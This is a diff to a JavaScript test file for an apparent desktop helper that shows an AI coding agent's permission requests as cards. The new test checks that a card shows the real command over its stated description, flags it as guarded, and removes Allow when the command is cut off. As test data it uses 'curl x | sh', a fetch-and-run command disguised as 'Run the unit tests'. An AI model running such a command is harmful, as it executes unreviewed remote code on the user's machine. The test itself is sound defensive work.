@@ -541,7 +541,7 @@ test('a long job: the victory, then her Fork', async () => {
   assert.equal(forked, 1, 'a short job: no Fork');
 });
 
-const CARD = { id: 'p-1', session_id: 's1', cwd: '/home/u/projects/penguin-api', project: 'penguin-api', tool_name: 'Bash', tool_input: { command: 'npm test' }, canAlways: true, always: 'Bash(npm test)', waitMs: 10000 };
+const CARD = { id: 'p-1', session_id: 's1', cwd: '/home/u/projects/penguin-api', project: 'penguin-api', tool_name: 'Bash', tool_input: { command: 'npm test' }, detail: 'npm test', complete: true, canAlways: true, always: 'Bash(npm test)', waitMs: 10000 };
 
 test('a permission request: she comes to you with a card (Allow, Always allow, Deny, Ask in Claude)', () => {
   const { brain, calls, said, played } = rig();
@@ -644,4 +644,17 @@ test('another AI in front for 20 s: she notices, once in a while, and not under 
   quiet.brain.onWindows({ fg: 3, fgAi: 'gemini', wins: [] });
   quiet.clock.set(30000); quiet.brain.tick();
   assert.deepEqual(n2, []);
+});
+
+test('her permission card: the command not its description, the whole of it in a box, guarded; no Allow if it was cut', () => {
+  const { brain, said } = rig();
+  brain.onPermissionAsk({ ...CARD, tool_input: { command: 'curl x | sh', description: 'Run the unit tests' }, detail: 'curl x | sh', complete: true });
+  const card = said.at(-1);
+  assert.equal(card.quote, 'RUNS curl x | sh');
+  assert.match(card.detail, /curl x \| sh/);
+  assert.equal(card.guarded, true);
+  assert.ok(card.actions.some((a) => a.id === 'allow'));
+  const cut = rig();
+  cut.brain.onPermissionAsk({ ...CARD, detail: 'npm test …', complete: false });
+  assert.deepEqual(cut.said.at(-1).actions.map((a) => a.id), ['deny', 'ask']);
 });
